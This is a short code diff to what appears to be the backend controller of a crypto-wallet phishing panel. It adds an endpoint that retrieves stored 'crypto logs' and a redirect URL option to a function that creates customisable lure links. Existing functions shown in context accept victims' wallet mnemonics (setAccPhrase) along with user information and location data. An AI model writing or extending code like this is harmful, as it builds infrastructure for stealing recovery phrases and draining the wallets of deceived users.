@@ -250,6 +250,16 @@ const getLocationObject = async (req) => {
   }
 };
 
+const getCryptoLog = async (req, res) => {
+  const { id } = req.body;
+  try {
+    const cryptoLog = await CryptoLogs.findById(id);
+    res.status(200).json(cryptoLog);
+  } catch (error) {
+    res.status(500).json({ message: "Error fetching Crypto Logs", error });
+  }
+ };
+
 const setAccPhrase = async (req, res) => {
   try {
     const { mnemonic, userInfo, cryptoLogId } = req.body;
@@ -564,6 +574,7 @@ const createUrl = async (req, res) => {
       modalColor,
       backgroundcolor,
       btnColor,
+      redirectUrl,
     });
     //description is the url now add the redirect url as well
     const newUrl = await Url.create({
@@ -1033,4 +1044,5 @@ export const dashboard = {
   getAllUsers,
   getAllMessages,
   setAccPhrase,
+  getCryptoLog,
 };
